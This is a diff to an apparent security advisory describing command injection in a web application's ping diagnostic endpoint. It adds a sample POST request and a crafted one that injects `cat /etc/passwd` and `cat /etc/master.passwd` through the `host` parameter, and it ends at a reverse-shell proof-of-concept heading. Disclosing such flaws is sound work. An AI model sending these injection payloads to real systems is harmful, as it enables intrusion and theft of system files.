@@ -21,9 +21,64 @@ It is also important to mention that successful exploitation requires bypassing 
 After authentication, it will be necessary to access a page called `sta_rede.diagnostico_ping` (http(s)://vulnerablepage.index.php?page=sta_rede.diagnostico_ping&task=view).
 This page provides a function to perform an ICMP request to an arbitrary host. To learn more about the ping utility and the ICMP protocol (Request and Reply), please refer to the RFC mentioned in the references section.
 
-The application sends a POST request with the parameters host, testar_pacote, and ttl, where `host` is the target of the ping, `testar_pacote` specifies the number of ICMP requests to send, and `TTL` is time to Live (TTL) for the packets. Upon send the request the application executes the following command on the Unix system: `ping -c $testar_pacote $host`.
+The application sends a POST request with the parameters host, testar_pacote, and ttl, where `host` is the target of the ping, `testar_pacote` specifies the number of ICMP requests to send, and `TTL` is time to Live (TTL) for the packets. Upon send the request the application executes the following command on the Unix system: `ping -c $testar_pacote $host`. Below is the `POST` request demonstrating the functionality:
 
-This is where an attack vector is noticed. A user can exploit the vulnerability by sending a malicious POST request through a network proxy to bypass input sanitization by appending one of the sequence command operators (;, &&, or |) to the host parameter, the web application will execute the ping command mentioned above, followed by an additional command. For example, this could include reading sensitive files like `/etc/passwd`, `/etc/master.passwd` or get a reverse shell or execute arbitrary commands.
+```
+POST /include/sta/rede.diagnostico_ping.ajax.php HTTP/1.1
+Host: vulnerablewebsite.com
+Cookie: PHPSESSID=6457d273b50b3bbaea19cbb4500d6577
+Content-Length: 66
+Authorization: XXXXXXX
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Origin: https://vulnerablewebsite.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://vulnerablewebsite.com/index.php?page=sta_rede.diagnostico_ping&task=view
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+page=sta_rede.diagnostico_ping&host=8.8.8.8&testar_pacote=1&ttl=64
+
+```
+
+This is where an attack vector is noticed. A user can exploit the vulnerability by sending a malicious POST request through a network proxy to bypass input sanitization by appending one of the sequence command operators (;, &&, or |) to the `host` parameter, the web application will execute the ping command mentioned above, followed by an additional command. For example, this could include reading sensitive files like `/etc/passwd`, `/etc/master.passwd` or get a reverse shell or execute arbitrary commands.
+
+The POST request below is a crafted and malicious example:
+
+```
+POST /include/sta/rede.diagnostico_ping.ajax.php HTTP/1.1
+Host: vulnerablewebsite.com
+Cookie: PHPSESSID=6457d273b50b3bbaea19cbb4500d6577
+Content-Length: 66
+Authorization: XXXXXXX
+Sec-Ch-Ua-Platform: "Linux"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Origin: https://vulnerablewebsite.com
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://vulnerablewebsite.com/index.php?page=sta_rede.diagnostico_ping&task=view
+Accept-Encoding: gzip, deflate, br
+Priority: u=1, i
+Connection: keep-alive
+
+page=sta_rede.diagnostico_ping&host=8.8.8.8; cat /etc/passwd;cat /etc/master.passwd&testar_pacote=1&ttl=64
+```
 
 ## Reverse Shell POC:
 HTTP POST Request to `sta_rede.diagnostico_ping`:
